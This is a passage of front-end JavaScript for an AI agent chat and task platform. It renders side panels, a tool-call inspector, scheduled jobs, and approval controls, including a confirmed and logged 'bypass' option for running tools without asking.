          ${steps.map((p) => `<div class="plan-step ${p.status}"><span class="b">${p.status === "done" ? "✓" : ""}</span><span>${esc(p.text)}</span></div>`).join("")}</div>`; }).join("")}
      ${s.task ? "" : `<div class="side-card">
        <h4>In this chat · ${members.length}</h4>
        ${members.map((h) => { const a = team.byHandle[h]; return `<div class="mem-row">${face(h, 30, a?.status.state)}<div class="grow" style="min-width:0"><div><b>${esc(a?.name ?? h)}</b>${h === s.agent ? `<span class="lead-tag">answers</span>` : ""}</div><div class="small faint ellipsis">${esc(a?.title ?? "")}</div></div></div>`; }).join("")}
        <label class="field small">Answers when nobody is @mentioned<select class="input" id="lead-pick">${team.agents.map((a) => `<option value="${esc(a.handle)}" ${a.handle === s.agent ? "selected" : ""}>${esc(a.name)} · ${esc(a.title)}</option>`).join("")}</select></label>
        ${s.allow?.length ? `<div class="small faint">Allowed without asking here: ${s.allow.map((t) => `<code>${esc(prettyTool(t))}</code>`).join(", ")}</div>` : ""}
      </div>`}
      ${s.id ? `<div class="side-card${s.bypass ? " bypass-on" : ""}">
        <h4>Approvals</h4>
        <label class="row" style="gap:8px;cursor:pointer"><input type="checkbox" id="bypass" ${s.bypass ? "checked" : ""}><span><b>Bypass</b>: run tools without asking ${s.task ? "in this task" : "in this chat"}</span></label>
        <div class="small ${s.bypass ? "" : "faint"}">${s.bypass ? "⚠ On. Shell commands and other actions run without your OK here. Other chats still ask." : "Off. Actions like shell commands wait for your OK."}</div>
      </div>` : ""}
      ${s.task ? "" : `<div class="side-card" id="files-card">
        <h4>Files in this chat${state.files.length ? ` · ${state.files.length}` : ""}</h4>
        ${state.files.length ? `<div class="chat-files">${state.files.slice(0, 40).map((f) => `<div class="chat-file">
            <a class="cf-thumb" href="${esc(f.url)}" target="_blank" rel="noopener" title="Open ${esc(f.name)}">${f.image ? `<img src="${esc(f.url)}" alt="" loading="lazy">` : `<span class="file-ic">${esc((f.name.includes(".") ? f.name.split(".").pop() : "file").slice(0, 4))}</span>`}</a>
            <div class="grow" style="min-width:0"><a class="ellipsis cf-name" href="${esc(f.url)}" target="_blank" rel="noopener">${esc(f.name)}</a><div class="small faint">${bytes(f.size)} · ${ago(f.modified)}</div></div>
            <a class="foot-btn" href="${esc(f.url)}?download=1" title="Download">↓</a>
            <button class="foot-btn" data-rmfile="${esc(f.path)}" title="Remove">✕</button></div>`).join("")}</div>
          <a class="small" href="/files#${esc(state.filesFolder ?? "")}">Open the folder in Workspace →</a>`
          : `<div class="small faint">Attach files with 📎, by pasting or by dropping them on the chat. They're kept in this chat's own folder, and the agents know to look there.</div>`}
      </div>`}
      <div class="side-card">
        <h4>Jobs &amp; background work</h4>
        ${state.work.jobs.length || state.work.tasks.length ? `
          ${state.work.jobs.map((j) => `<div class="work-row"><span class="work-ic ${j.enabled ? "on" : ""}">${ICON.clock}</span>
            <div class="grow" style="min-width:0"><div class="ellipsis" style="font-weight:550">${esc(j.title)}</div><div class="small faint">${esc(humanSchedule(j.schedule))}${j.enabled ? ` · next ${esc(j.next_local ?? "—")}` : " · paused"}</div></div>
            <button class="foot-btn" data-jobtoggle="${j.id}" data-on="${j.enabled ? 1 : 0}">${j.enabled ? "Pause" : "Resume"}</button></div>`).join("")}
          ${state.work.tasks.map((t) => `<a class="work-row" href="/tasks/${t.id}"><span class="tstat ${esc(t.status)}"></span>
            <div class="grow" style="min-width:0"><div class="ellipsis">${esc(t.title)}</div><div class="small faint">${esc(agentName(t.agent))} · ${esc(t.status)} · ${ago(t.updated_at)}</div></div></a>`).join("")}`
        : `<div class="small faint">Ask for something regular ("every morning at 7…") or for later ("remind me tomorrow…") and it shows up here. Results are posted in this chat.</div>`}
      </div>
      <div class="side-card">
        <h4>Conversation</h4>
        ${st.ctx ? `<div class="ctx-big"><b>${fmtTok(st.ctx.used)}</b><span>${st.ctx.window ? `of ${fmtTok(st.ctx.window)} tokens` : "tokens"}</span>${pct != null ? `<em class="${ctxLevel(pct)}">${pct < 1 ? "<1" : Math.round(pct)}%</em>` : ""}</div>${pct != null ? `<div class="ctx-meter ${ctxLevel(pct)}"><i style="width:${Math.max(pct, 1.5)}%"></i></div>` : ""}`
          : st.freshSummary ? `<div class="ctx-big"><b>Fresh</b><span>continues from a summary</span></div>` : `<div class="small faint">How full the conversation is shows after the first answer. It's compacted automatically when it fills up.</div>`}
        <div class="row-tight">${s.compacting ? `<span class="working small"><span class="spinner" style="width:12px;height:12px"></span>Compacting…</span>` : `<button class="btn sm" id="compact" ${s.working?.length || !st.turns ? "disabled" : ""} title="Summarise everything so far; the conversation continues from the summary">${ICON.refresh}Compact now</button>`}
          <button class="btn sm ghost" id="export-md" title="The conversation as a Markdown file">${ICON.download}Markdown</button>
          <a class="btn sm ghost" href="/api/sessions/${esc(s.id)}/conversation" download="los-${esc(s.id.slice(0, 12))}.json" title="The whole conversation as standard JSON (with tool calls)">${ICON.download}JSON</a></div>
        ${lc ? `<div class="small faint">Last compacted ${ago(st.lastCompact.created_at)}${lc.auto ? " (automatically)" : ""}.</div>` : ""}
        <div class="tiles"><div><b>${st.turns}</b><span>messages</span></div><div><b>${st.tools}</b><span>tool calls</span></div><div><b>${st.total.ms ? fmtMs(st.total.ms) : "—"}</b><span>thinking time</span></div><div><b>${st.total.cost ? fmtCost(st.total.cost) : "—"}</b><span title="What these tokens would cost on the API">API value</span></div></div>
      </div>
      ${s.task ? "" : `<div class="row" style="gap:8px"><button class="btn sm ghost" id="arch-chat">${s.archived ? "Unarchive" : "Archive"}</button><button class="btn sm danger ghost" id="del-chat">${ICON.trash}Delete chat</button></div>`}`;
    $$("[data-jobtoggle]", side).forEach((b) => (b.onclick = async () => { try { await api(`/api/jobs/${b.dataset.jobtoggle}`, { method: "PATCH", body: { enabled: b.dataset.on !== "1" } }); loadWork(); } catch (err) { fail(err); } }));
    if ($("#lead-pick", side)) $("#lead-pick", side).onchange = async (e) => {
      try { await api(`/api/sessions/${s.id}`, { method: "PATCH", body: { lead: e.target.value } }); s.agent = e.target.value; if (!s.members.includes(s.agent)) s.members.push(s.agent); await loadSpace(true); renderHead(); renderSide(); renderInfo(); } catch (err) { fail(err); }
    };
    const btn = $("#compact", side);
    if (btn) btn.onclick = async () => { try { btn.disabled = true; await api(`/api/sessions/${s.id}/compact`, { method: "POST", body: {} }); s.compacting = true; renderInfo(); } catch (err) { btn.disabled = false; fail(err); } };
    if ($("#info-close", side)) $("#info-close", side).onclick = () => { state.infoOpen = false; renderInfo(); };
    $$("[data-rmfile]", side).forEach((b) => (b.onclick = async () => {
      const p = b.dataset.rmfile;
      if (!confirm(`Remove ${p.split("/").pop()} from this chat's folder?`)) return;
      try { await api(`/api/workspace?path=${encodeURIComponent(p)}`, { method: "DELETE" }); loadFiles(); } catch (err) { fail(err); }
    }));
    if ($("#export-md", side)) $("#export-md", side).onclick = async () => {
      try {
        const r = await api(`/api/sessions/${s.id}/markdown`);
        const url = URL.createObjectURL(new Blob([r.markdown], { type: "text/markdown" }));
        Object.assign(document.createElement("a"), { href: url, download: r.name }).click();
        setTimeout(() => URL.revokeObjectURL(url), 5000);
      } catch (err) { fail(err); }
    };
    if ($("#bypass", side)) $("#bypass", side).onchange = async (e) => {
      const on = e.target.checked;
      if (on && !confirmBypass(s.task ? "this task" : "this chat")) { e.target.checked = false; return; }
      try { await api(`/api/sessions/${s.id}`, { method: "PATCH", body: { bypass: on } }); s.bypass = on ? 1 : 0; renderHead(); renderInfo(); }
      catch (err) { e.target.checked = !on; fail(err); }
    };
    if ($("#arch-chat", side)) $("#arch-chat", side).onclick = async () => {
      try {
        await api(`/api/sessions/${s.id}`, { method: "PATCH", body: { archived: !s.archived } });
        s.archived = !s.archived; toast(s.archived ? "Archived: it's under “archived” in the chat list" : "Back in your chats");
        await loadSpace(true); renderSide(); renderInfo();
      } catch (err) { fail(err); }
    };
    if ($("#del-chat", side)) $("#del-chat", side).onclick = async () => {
      if (!confirm(`Delete "${s.title || "this chat"}" and everything said in it?`)) return;
      try { await api(`/api/sessions/${s.id}`, { method: "DELETE" }); await loadSpace(true); navigate("/chat/new"); } catch (err) { fail(err); }
    };
  }

  const refresh = debounce(async () => {
    if (!state.id || state.id === "new") return;
    try {
      const fresh = await api(`/api/sessions/${state.id}`);
      if (fresh.id !== state.id) return;
      fresh.runStarted = fresh.working.length ? state.session?.runStarted : undefined;
      for (const k of Object.keys(state.live)) if (!fresh.live.some((l) => liveKey(l.turn, l.agent) === k)) delete state.live[k];
      seedLive(fresh);
      state.session = fresh;
      renderHead(); renderMsgs(); renderInfo();
    } catch { /* deleted elsewhere */ }
  }, 150);
  const refreshSpace = debounce(() => loadSpace(true).then(() => { renderSide(); }), 300);

  async function update(id) {
    space.classList.remove("side-open");
    clearInterval(state.tick);
    const leadQ = new URLSearchParams(location.search).get("lead");
    if (!id) id = team.chats[0]?.id ?? "new"; // "/" opens the latest chat
    await open(id, leadQ);
  }
  await update(initialId);
  return {
    update,
    onDelta,
    onAgent: (e) => {
      if (e.sessionId && e.sessionId === state.id && state.session) {
        const s = state.session;
        s.events.push({ id: e.id, turn: e.turn, agent: e.agent, type: e.event.type, data: e.event, created_at: new Date().toISOString() });
        state.lastSign[liveKey(e.turn, e.agent)] = Date.now();
        const lv = state.live[liveKey(e.turn, e.agent)];
        if (lv && ["text", "tool_call"].includes(e.event.type)) lv.gap = true;
        if (e.turn != null && e.agent && !s.live.some((l) => l.agent === e.agent && l.turn === e.turn) && !["usage", "context"].includes(e.event.type)) {
          s.live.push({ agent: e.agent, turn: e.turn });
          s.working = [...new Set([...s.working, e.agent])];
        }
        if (e.event.type === "context" || e.event.type === "usage") { renderHead(); renderInfo(); }
        if (e.event.type === "compact" || (e.turn == null && e.event.type === "error")) refresh();
        renderMsgs();
      }
    },
    onUi: (e) => {
      if (["run", "report", "rooms", "tasks", "config", "brains"].includes(e.kind)) refreshSpace();
      if (e.kind === "run" && e.sessionId === state.id) { refresh(); if (e.running === false) loadFiles(); }
      if (e.kind === "approvals" && state.id) refresh();
      if (e.kind === "report" && e.sessionId === state.id) { refresh(); loadWork(); }
      if (e.kind === "tasks" && state.id) loadWork();
      if (e.kind === "workspace" && state.id) loadFiles();
      if (e.kind === "config") loadMeta(true).then(() => { renderSide(); renderHead(); });
    },
    destroy: () => { clearInterval(state.tick); document.querySelector(".popmenu")?.remove(); document.removeEventListener("keydown", keys); },
  };
}

/** Everything one agent did for one turn, in full: every call with its whole result, approvals, notes, cost. */
async function inspectRun(sessionId, turn, agent) {
  const d = openDrawer(`${drawerHead(`${agentName(agent)}'s work`, "Every tool call and its full result, in order. Nothing here is shortened.")}<div class="drawer-body" id="insp"><div class="working"><span class="spinner"></span>Loading…</div></div>
    <div class="drawer-foot"><span class="small faint grow">The request ${esc(agentName(agent))}'s brain got, as OpenAI chat-completions JSON (system, messages, tools).</span>
      <button class="btn" id="ctx-export">${ICON.download}Export context</button></div>`, { wide: true });
  $("#ctx-export", d.el).onclick = async () => {
    try {
      const body = await api(`/api/sessions/${sessionId}/context?turn=${turn}&agent=${encodeURIComponent(agent)}`);
      const url = URL.createObjectURL(new Blob([JSON.stringify(body, null, 2)], { type: "application/json" }));
      Object.assign(document.createElement("a"), { href: url, download: `los-context-${agent}-${turn}.json` }).click();
      setTimeout(() => URL.revokeObjectURL(url), 5000);
    } catch (e) { fail(e); }
  };
  try {
    const r = await api(`/api/sessions/${sessionId}/inspect?turn=${turn}&agent=${encodeURIComponent(agent)}`);
    const results = new Map(r.messages.filter((m) => m.role === "tool").map((m) => [m.tool_call_id, m.content]));
    const outputs = new Map(r.events.filter((e) => e.type === "tool_result").map((e) => [e.data.id, e.data]));
    const pre = (s) => `<pre class="insp-pre">${esc(s)}</pre>`;
    const rows = [];
    if (r.turn) rows.push(`<div class="insp-row"><div class="insp-h">${r.turn.name === "handoff" ? "Handoff" : "Your message"}</div><div class="md small">${md(r.turn.content)}</div></div>`);
    let n = 0, usage = { input: 0, output: 0, cached: 0, cost: 0, ms: 0 };
    for (const e of r.events) {
      const ev = e.data;
      if (e.type === "tool_call") {
        n++;
        const out = results.get(ev.call.id) ?? outputs.get(ev.call.id)?.output ?? outputs.get(ev.call.id)?.preview;
        const ok = outputs.get(ev.call.id)?.ok;
        rows.push(`<details class="insp-row insp-call ${ok === false ? "bad" : ""}"><summary><span class="insp-n">${n}</span><b>${esc(prettyTool(ev.call.name))}</b><span class="faint ellipsis">${esc(argsSummary(ev.call))}</span><span class="faint small">${clock(e.created_at)}${out != null ? ` · ${bytes(String(out).length)}` : ""}</span></summary>
          <div class="insp-h">Arguments</div>${pre(JSON.stringify(ev.call.args, null, 2))}
          <div class="insp-h">Result${ok === false ? " (failed)" : ""}</div>${out != null ? pre(out) : `<div class="small faint">no result recorded</div>`}</details>`);
      } else if (e.type === "approval") rows.push(`<div class="insp-row small">${ev.bypass ? "⚠ Ran without asking (bypass)" : ev.granted ? "✅ You approved" : "⛔ Denied"} <code>${esc(prettyTool(ev.call.name))}</code> · ${clock(e.created_at)}</div>`);
      else if (e.type === "runtime" && ev.raw?.type === "limit") rows.push(`<div class="insp-row small">⏱ Hit the limit (${esc(ev.raw.over)})${ev.raw.wrap_up ? ": stopped and asked to write up" : ""}</div>`);
      else if (e.type === "runtime" && ev.raw?.type === "inbox") rows.push(`<div class="insp-row small">✉️ ${plural(ev.raw.delivered, "new message")} handed over while working</div>`);
      else if (e.type === "runtime" && ev.raw?.type === "fallback") rows.push(`<div class="insp-row small">↪ ${esc(brainLabel(ev.raw.from))} couldn't take it; ${esc(brainLabel(ev.raw.to))} answered. ${esc(ev.raw.reason)}</div>`);
      else if (e.type === "error") rows.push(`<div class="insp-row msg-err">${esc(ev.message)}</div>`);
      else if (e.type === "usage") for (const k of Object.keys(usage)) usage[k] += ev[k] ?? 0;
    }
    const answer = r.messages.filter((m) => m.role === "assistant" && m.content?.trim()).at(-1);
    if (answer) rows.push(`<div class="insp-row"><div class="insp-h">Answer</div><div class="md small">${md(answer.content)}</div></div>`);
    $("#insp", d.el).innerHTML = `<div class="tiles"><div><b>${n}</b><span>tool calls</span></div><div><b>${usage.ms ? fmtMs(usage.ms) : "—"}</b><span>time</span></div><div><b>${fmtTok(usage.input + usage.cached)}</b><span>tokens in</span></div><div><b>${usage.cost ? fmtCost(usage.cost) : "—"}</b><span>API value</span></div></div>${rows.join("")}`;
    enhance($("#insp", d.el));
  } catch (e) { $("#insp", d.el).innerHTML = `<div class="msg-err">${esc(e.message)}</div>`; }
}
const clockShort = (ts) => toDate(ts)?.toLocaleTimeString(undefined, { hour: "2-digit", minute: "2-digit" }) ?? "";
function dayClock(ts) {
  const d = toDate(ts), now = new Date();
  if (!d) return "";
  const t = d.toLocaleTimeString(undefined, { hour: "2-digit", minute: "2-digit" });
  if (d.toDateString() === now.toDateString()) return `Today ${t}`;
  if (d.toDateString() === new Date(now - 864e5).toDateString()) return `Yesterday ${t}`;
  return `${d.toLocaleDateString(undefined, { day: "numeric", month: "short" })} ${t}`;
}

function greeting() {
  const h = new Date().getHours();
  const n = team.me?.name && team.me.name !== "you" ? `, ${team.me.name}` : "";
  return h < 5 ? `God natt${n}` : h < 10 ? `God morgen${n}` : h < 17 ? `Hei${n}` : `God kveld${n}`;
}
// "0 7 * * *" → "every day at 07:00". Falls back to the raw schedule.
function humanSchedule(sc) {
  const e = /^every\s+(\d+)\s*(m|h|d)/i.exec(sc);
  if (e) return `every ${e[1] === "1" ? "" : e[1] + " "}${{ m: "minute", h: "hour", d: "day" }[e[2].toLowerCase()]}${e[1] === "1" ? "" : "s"}`;
  const f = sc.trim().split(/\s+/);
  if (f.length !== 5 || !/^\d+$/.test(f[0]) || !/^\d+$/.test(f[1])) return sc;
  const at = `${f[1].padStart(2, "0")}:${f[0].padStart(2, "0")}`;
  const days = { "*": "every day", "1-5": "weekdays", "0,6": "weekends", "6,0": "weekends", "0": "Sundays", "1": "Mondays", "2": "Tuesdays", "3": "Wednesdays", "4": "Thursdays", "5": "Fridays", "6": "Saturdays" };
  if (f[2] === "*" && f[3] === "*" && days[f[4]]) return `${days[f[4]]} at ${at}`;
  if (/^\d+$/.test(f[2]) && f[3] === "*" && f[4] === "*") return `monthly on the ${f[2]}${["th", "st", "nd", "rd"][+f[2] % 10 > 3 || [11, 12, 13].includes(+f[2]) ? 0 : +f[2] % 10]} at ${at}`;
  return sc;
}
function thinkingHtml(text, open) {
  return `<details class="thinking" ${open ? "open" : ""}><summary>${ICON.spark}${open ? "Thinking…" : "Thought process"}</summary><div class="md small">${md(text)}</div></details>`;
}
// A finished background task or job, posted into the chat.
function reportHtml(m) {
  const [head, ...rest] = m.content.split("\n\n");
  const body = rest.join("\n\n"), job = head.startsWith("Scheduled job"), failed = / (failed|was cancelled) /.test(head);
  const task = /^task:(\d+)$/.exec(m.brain ?? "")?.[1];
  const long = body.length > 900;
  return `<div class="report ${failed ? "bad" : ""} ${long ? "" : "open"}">
    <div class="report-head"><span class="report-ic">${job ? ICON.clock : ICON.tasks}</span><span class="grow">${esc(head.replace(/\.$/, ""))}</span>
      <span class="faint small">${clock(m.created_at)}</span>${task ? `<a class="small" href="/tasks/${task}">open</a>` : ""}</div>
    <div class="md report-body">${md(body)}</div>${long ? `<button class="btn sm ghost" data-more>Show all</button>` : ""}</div>`;
}

// Tool steps for one turn: calls paired with their results, plus loads, approvals and runtime notes.
function stepsHtml(events, live) {
  const results = new Map(events.filter((e) => e.type === "tool_result").map((e) => [e.ev.id, e.ev]));
  const rows = [];
  let calls = 0, failed = 0;
  for (const e of events) {
    if (e.type === "tool_call") {
      calls++;
      const r = results.get(e.ev.call.id);
      if (r && !r.ok) failed++;
      rows.push(`<div class="step ${r ? (r.ok ? "ok" : "bad") : live ? "pending" : ""}"><span class="ic"></span><div>
        <div class="nm">${esc(prettyTool(e.ev.call.name))}</div><div class="args">${esc(argsSummary(e.ev.call))}</div>
        ${r?.preview ? `<div class="res">${esc(r.preview)}</div>` : ""}</div></div>`);
    } else if (e.type === "tools_loaded") {
      rows.push(`<div class="step ok"><span class="ic"></span><div class="small muted">loaded ${e.ev.names.map((n) => `<code>${esc(n)}</code>`).join(", ")}</div></div>`);
    } else if (e.type === "approval") {
      rows.push(`<div class="step ${e.ev.granted ? "ok" : "bad"}"><span class="ic"></span><div class="small">${e.ev.bypass ? "⚠ ran without asking (bypass)" : e.ev.granted ? "you approved" : "denied"} <code>${esc(prettyTool(e.ev.call.name))}</code></div></div>`);
    } else if (e.type === "runtime" && e.ev.raw?.type === "fallback") {
      rows.push(`<div class="step bad"><span class="ic"></span><div class="small">${esc(brainLabel(e.ev.raw.from))} couldn't take this turn, so ${esc(brainLabel(e.ev.raw.to))} answered<div class="res">${esc(e.ev.raw.reason)}</div></div></div>`);
    } else if (e.type === "runtime" && e.ev.raw?.subtype === "compact_boundary") {
      rows.push(`<div class="step ok"><span class="ic"></span><div class="small muted">the brain compacted its own context</div></div>`);
    }
  }
  if (!rows.length) return "";
  const names = [...new Set(events.filter((e) => e.type === "tool_call").map((e) => prettyTool(e.ev.call.name)))];
  const label = calls ? `${plural(calls, "step")}${failed ? ` · <span class="bad-txt">${failed} failed</span>` : ""}<span class="faint ellipsis"> · ${esc(names.slice(0, 4).join(", "))}${names.length > 4 ? "…" : ""}</span>` : "notes";
  return `<details class="steps" ${live ? "open" : ""}><summary>${live ? `<span class="spinner" style="width:11px;height:11px"></span>` : ""}${label}</summary>${rows.join("")}</details>`;
}
const prettyTool = (n) => n.startsWith("mcp__") ? n.slice(5).replace("__", " · ") : n;
// Bypass: tools that need your OK run without asking (per chat, per task, per job). Always confirmed with this warning.
const confirmBypass = (where) => confirm(`Turn on bypass for ${where}?\n\n⚠ Agents will run tools that normally need your OK without asking: shell commands, file sharing, sending, deleting, external MCP tools.\n\nShell commands run inside the los container and can read and change data/ (logins, the database) and private files. An agent steered by a web page or mail it read could misuse that.\n\nOnly turn it on for work you trust. Every call that runs this way is marked "bypass" in the log.`);
function argsSummary(call) {
  const a = call.args ?? {};
  const pick = a.command ?? a.path ?? a.file_path ?? a.pattern ?? a.query ?? a.url ?? a.text ?? a.prompt ?? a.description;
  const s = typeof pick === "string" ? pick : JSON.stringify(a);
  return s.length > 220 ? s.slice(0, 220) + "…" : s;
}

// ── tasks ────────────────────────────────────────────────────────────────
async function viewTasks(root, initialId) {
  await loadMeta();
  const state = { filter: "", tasks: [], jobs: [], waiting: [], openId: null };
  root.innerHTML = `<div class="page">
    <div class="page-head"><div><h1>Tasks &amp; jobs</h1><p>Work that runs on its own. Jobs repeat on a schedule; tasks run once, now or later. Several run at once, and each posts its result into the chat that asked for it. If one wants to do something that needs your OK, it waits here.</p></div>
      <div class="actions"><button class="btn" id="new-job">${ICON.clock}New job</button><button class="btn primary" id="new-task">${ICON.plus}New task</button></div></div>
    <div id="needs-you"></div>
    <h2 class="section">Jobs <span class="count" id="job-count"></span></h2>
    <div class="jobs" id="jobs"></div>
    <h2 class="section">Tasks</h2>
    <div class="row" style="margin-bottom:12px"><div class="tabs" id="tabs"></div></div>
    <div class="card"><div class="table-wrap"><table class="table"><thead><tr><th>#</th><th>Task</th><th>Agent</th><th>Status</th><th class="nowrap">Updated</th></tr></thead><tbody id="rows"></tbody></table></div></div>
  </div>`;
  async function load() {
    [state.tasks, state.jobs, state.waiting] = await Promise.all([api("/api/tasks"), api("/api/jobs"), api("/api/approvals")]);
    renderNeedsYou();
    renderJobs();
    const counts = state.tasks.reduce((a, t) => ((a[t.status] = (a[t.status] ?? 0) + 1), a), {});
    $("#tabs", root).innerHTML = [["", "All", state.tasks.length], ["waiting", "Needs you"], ["queued", "Queued"], ["running", "Running"], ["done", "Done"], ["failed", "Failed"], ["cancelled", "Cancelled"]]
      .filter(([k]) => !["waiting", "cancelled"].includes(k) || counts[k])
      .map(([k, label, n]) => `<button data-f="${k}" class="${state.filter === k ? "on" : ""}">${label}<span class="n">${n ?? counts[k] ?? 0}</span></button>`).join("");
    $$("#tabs button", root).forEach((b) => (b.onclick = () => { state.filter = b.dataset.f; load(); }));
    const rows = state.tasks.filter((t) => !state.filter || t.status === state.filter);
    $("#rows", root).innerHTML = rows.length ? rows.map((t) => `
      <tr class="click" data-id="${t.id}">
        <td class="faint mono small">${t.id}</td>
        <td style="max-width:520px"><div style="font-weight:550">${esc(t.title)}</div>${t.result ? `<div class="small muted ellipsis">${esc(t.result.replace(/\s+/g, " "))}</div>` : ""}
          ${t.parent_id ? `<div class="small faint">delegated by #${t.parent_id}</div>` : ""}</td>
        <td><div class="row">${t.agent ? avatar(t.agent, 22) + esc(t.agent) : `<span class="faint">routing</span>`}</div>${t.brain ? `<div class="small faint">${esc(t.brain)}</div>` : ""}</td>
        <td><span class="status ${t.status}">${t.status}</span>${t.private ? ` <span title="private result">🔒</span>` : ""}${t.bypass ? ` <span class="chip warn" title="Bypass: runs tools without asking">⚠ bypass</span>` : ""}</td>
        <td class="small muted nowrap">${t.status === "queued" && toDate(t.run_at) > new Date() ? `runs ${fullTime(t.run_at)}` : ago(t.updated_at)}${t.job_id ? `<div class="faint">job #${t.job_id}</div>` : ""}</td>
      </tr>`).join("") : `<tr><td colspan="5"><div class="empty"><h3>Nothing here</h3><p>Create a task, or ask an agent in chat to delegate something.</p></div></td></tr>`;
    $$("#rows tr[data-id]", root).forEach((tr) => (tr.onclick = () => navigate(`/tasks/${tr.dataset.id}`)));
  }

  // Background tasks waiting for an OK (chats show their own approvals inline).
  function renderNeedsYou() {
    const list = state.waiting.filter((a) => a.taskId);
    $("#needs-you", root).innerHTML = list.length ? `<h2 class="section" style="margin-top:0">Needs you <span class="count">${list.length}</span></h2>
      <div class="stack">${list.map((a) => `<div class="approval" data-approval="${esc(a.id)}">
        <div><b>${esc(a.task?.agent ?? "An agent")}</b> on task <a href="/tasks/${a.taskId}">#${a.taskId} ${esc(a.task?.title ?? "")}</a> wants to run <code>${esc(prettyTool(a.call.name))}</code>.</div>
        <pre>${esc(a.call.args?.command ?? JSON.stringify(a.call.args, null, 2))}</pre>
        <div class="row"><button class="btn primary sm" data-grant="1">Allow</button><button class="btn sm" data-grant="0">Deny</button><span class="small faint">${ago(a.createdAt)}</span></div>
      </div>`).join("")}</div>` : "";
    $$("[data-approval]", root).forEach((el) => $$("[data-grant]", el).forEach((b) => (b.onclick = async () => {
      try { await api(`/api/approvals/${el.dataset.approval}`, { method: "POST", body: { granted: b.dataset.grant === "1" } }); load(); } catch (err) { fail(err); }
    })));
  }
  function renderJobs() {
    $("#job-count", root).textContent = state.jobs.length;
    $("#jobs", root).innerHTML = state.jobs.length ? state.jobs.map((j) => `<div class="job card ${j.enabled ? "" : "paused"}" data-job="${j.id}">
        <div class="job-top"><span class="job-ic">${ICON.clock}</span><div class="grow" style="min-width:0"><div class="job-title ellipsis">${esc(j.title)}</div>
          <div class="small muted">${esc(humanSchedule(j.schedule))}${j.agent ? ` · ${esc(j.agent)}` : ""}${j.bypass ? ` · <span class="chip warn" title="Bypass: runs tools without asking">⚠ bypass</span>` : ""}</div></div>
          <label class="switch" title="${j.enabled ? "On: click to pause" : "Paused: click to resume"}"><input type="checkbox" data-jtoggle="${j.id}" ${j.enabled ? "checked" : ""}><span></span></label></div>
        <div class="small faint ellipsis2">${esc(j.prompt)}</div>
        <div class="job-foot small">
          <span>${j.enabled ? `next <b>${esc(j.next_local ?? "—")}</b>` : "paused"}</span>
          ${j.last_local ? `<span class="faint">· last ${esc(j.last_local)} ${j.last_status ? `<span class="status ${esc(j.last_status)}">${esc(j.last_status)}</span>` : ""}</span>` : ""}
          <span class="grow"></span>
          <button class="foot-btn" data-jrun="${j.id}" title="Run once now">${ICON.play}Run now</button>
          <button class="foot-btn" data-jedit="${j.id}">${ICON.edit}Edit</button>
        </div>
        ${j.report_title ? `<div class="small faint">reports to <a href="/chat/${esc(j.report_to)}">${esc(j.report_title)}</a></div>` : ""}
      </div>`).join("")
      : `<div class="card"><div class="empty small">No jobs yet. Ask in Home ("every morning at 7, check…"), or create one here.</div></div>`;
    $$("[data-jtoggle]", root).forEach((c) => (c.onchange = async () => { try { await api(`/api/jobs/${c.dataset.jtoggle}`, { method: "PATCH", body: { enabled: c.checked } }); load(); } catch (e) { fail(e); } }));
    $$("[data-jrun]", root).forEach((b) => (b.onclick = async () => { try { await api(`/api/jobs/${b.dataset.jrun}`, { method: "PATCH", body: { run_now: true } }); toast("Starting within half a minute"); load(); } catch (e) { fail(e); } }));
    $$("[data-jedit]", root).forEach((b) => (b.onclick = () => jobDrawer(state.jobs.find((j) => j.id == b.dataset.jedit))));
  }
  function jobDrawer(j) {
    const presets = [["0 7 * * *", "Every day 07:00"], ["30 7 * * 1-5", "Weekdays 07:30"], ["0 18 * * 0", "Sundays 18:00"], ["0 9 1 * *", "1st of the month"], ["every 1h", "Every hour"]];
    const d = openDrawer(`${drawerHead(j ? `Job #${j.id}` : "New job", "Runs again and again on a schedule. Each result is posted into Home.")}
      <form class="drawer-body" id="job-form">
        <label class="field">What should it do each time?<textarea class="input" name="prompt" rows="6" required placeholder="e.g. Check yr.no for Lillesand today. If it will rain, tell me when and how much.">${esc(j?.prompt ?? "")}</textarea></label>
        <label class="field">Title <input class="input" name="title" value="${esc(j?.title ?? "")}" placeholder="Morning weather"></label>
        <label class="field">Schedule <input class="input mono" name="schedule" required value="${esc(j?.schedule ?? "0 7 * * *")}">
          <span class="small faint">cron (minute hour day month weekday, your time zone) or "every 30m" / "every 2h"</span></label>
        <div class="chips">${presets.map(([v, l]) => `<button type="button" class="chip outline" data-preset="${esc(v)}" style="cursor:pointer">${esc(l)}</button>`).join("")}</div>
        <label class="field">Agent<select class="input" name="agent">${agentOptions(j?.agent ?? "", { auto: true })}</select></label>
        <label class="row" style="gap:8px;cursor:pointer"><input type="checkbox" name="bypass" ${j?.bypass ? "checked" : ""}><span><b>Bypass</b>: every run uses tools without asking (⚠ shell commands too)</span></label>
      </form>
      <div class="drawer-foot">${j ? `<button class="btn danger" id="j-del">${ICON.trash}Delete</button>` : ""}<span class="grow"></span><button class="btn" data-close>Cancel</button><button class="btn primary" id="j-save">${j ? "Save" : "Create job"}</button></div>`);
    $$("[data-preset]", d.el).forEach((b) => (b.onclick = () => { $("[name=schedule]", d.el).value = b.dataset.preset; }));
    $("#j-save", d.el).onclick = async () => {
      const f = Object.fromEntries(new FormData($("#job-form", d.el)));
      f.bypass = !!f.bypass;
      if (f.bypass && !j?.bypass && !confirmBypass("every run of this job")) return;
      try {
        if (j) await api(`/api/jobs/${j.id}`, { method: "PATCH", body: f });
        else await api("/api/jobs", { method: "POST", body: f });
        d.close(); load();
      } catch (e) { fail(e); }
    };
    const del = $("#j-del", d.el);
    if (del) del.onclick = async () => { if (!confirm("Delete this job?")) return; try { await api(`/api/jobs/${j.id}`, { method: "DELETE" }); d.close(); load(); } catch (e) { fail(e); } };
  }

  async function showTask(id) {
    state.openId = id;
    let t;
    try { t = await api(`/api/tasks/${id}`); } catch (e) { fail(e); return navigate("/tasks", { replace: true }); }
    const events = t.events.map((e) => ({ ...e, ev: JSON.parse(e.data) }));
    const d = openDrawer(`${drawerHead(`#${t.id} · ${esc(t.title)}`, `<span class="status ${t.status}">${t.status}</span> · ${esc(t.agent ?? "routing")}${t.brain ? ` on ${esc(t.brain)}` : ""} · created ${fullTime(t.created_at)}`)}
      <div class="drawer-body">
        <div><h2 class="section" style="margin-top:0">Prompt</h2><div class="md card card-pad">${md(t.prompt)}</div></div>
        ${t.result ? `<div><h2 class="section">Result</h2><div class="md card card-pad">${md(t.result)}</div></div>` : t.status === "running" ? `<div class="working"><span class="spinner"></span>Running…</div>` : t.status === "waiting" ? `<div class="notice warn"><span>⏸</span><div>Waiting for your OK. See "Needs you" on the Tasks page.</div></div>` : ""}
